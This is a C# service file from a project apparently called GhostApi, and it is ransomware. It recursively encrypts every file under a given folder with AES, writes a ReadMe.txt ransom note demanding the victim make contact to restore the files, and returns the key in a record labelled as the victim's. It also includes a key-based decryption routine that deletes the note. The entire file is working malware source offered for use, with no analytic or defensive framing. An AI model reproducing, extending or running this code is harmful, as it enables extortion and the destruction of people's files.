using GhostApi.Interfaces;
using GhostApi.Models;
using System.Security.Cryptography;

namespace GhostApi.Services
{
    public class GhostService : IGhostService
    {
        private static byte[] Key = null!;
        private static byte[] IV = null!;
        private static string FilePath = string.Empty;
        private static void GenerateAesKey()
        {
            using Aes aes = Aes.Create();
            Key = aes.Key;
            IV = aes.IV;
        }
        private static void EncryptFile(string filePath)
        {
            using Aes aes = Aes.Create();
            aes.Key = Key;
            aes.IV = IV;

            ICryptoTransform encryptor = aes.CreateEncryptor();
            byte[] originalBytes = File.ReadAllBytes(filePath);

            using FileStream inputFileStream = new(filePath, FileMode.Open, FileAccess.Write);
            using CryptoStream cryptoStream = new(inputFileStream, encryptor, CryptoStreamMode.Write);
            cryptoStream.Write(originalBytes, 0, originalBytes.Length);
        }
        private static void DecryptFile(string filePath)
        {
            using Aes aes = Aes.Create();
            aes.Key = Key;
            aes.IV = IV;

            ICryptoTransform decryptor = aes.CreateDecryptor();

            byte[] originalBytes = File.ReadAllBytes(filePath);
            File.WriteAllText(filePath, string.Empty);

            using Stream stream = new MemoryStream(originalBytes);
            using FileStream inputFileStream = new(filePath, FileMode.Open, FileAccess.Write);
            using CryptoStream cryptoStream = new(inputFileStream, decryptor, CryptoStreamMode.Write);
            cryptoStream.Write(originalBytes, 0, originalBytes.Length);
        }
        private static void BeginEncryption(string folderPath)
        {
            string[] files = Directory.GetFiles(folderPath);

            foreach (string file in files)
                EncryptFile(file);

            string[] subdirectories = Directory.GetDirectories(folderPath);
            foreach (string subdirectory in subdirectories)
                BeginEncryption(subdirectory);
        }
        private static void BeginDecryption(string folderPath)
        {
            string[] files = Directory.GetFiles(folderPath);

            foreach (string file in files)
            {
                if (!file.Contains("ReadMe"))
                    DecryptFile(file);
                else
                    File.Delete(file);
            }

            string[] subdirectories = Directory.GetDirectories(folderPath);
            foreach (string subdirectory in subdirectories)
                BeginDecryption(subdirectory);
        }
        private static void GenerateNote()
        {
            string fileName = $"ReadMe.txt";
            string message = "Your Files are Encrypted\n\nAttention:\n1. If you want restore your files, follow me";

            using StreamWriter writer = File.CreateText($"{FilePath}\\{fileName}");
            writer.WriteLine(message);
        }
        public GhostVictim StartEncryption(string filePath)
        {
            FilePath = filePath;
            GenerateAesKey();            
            BeginEncryption(filePath);
            GenerateNote();

            return new GhostVictim {Path = FilePath, Key = Key, IV = IV };
        }
        public bool StartDecryption(string filePath, string key, string iv) {
            FilePath = filePath;
            try
            {
                Key = Convert.FromBase64String(key);
                IV = Convert.FromBase64String(iv);

                BeginDecryption(filePath);
                return true;
            }catch(Exception ex) { return false; }
        }
    }
}
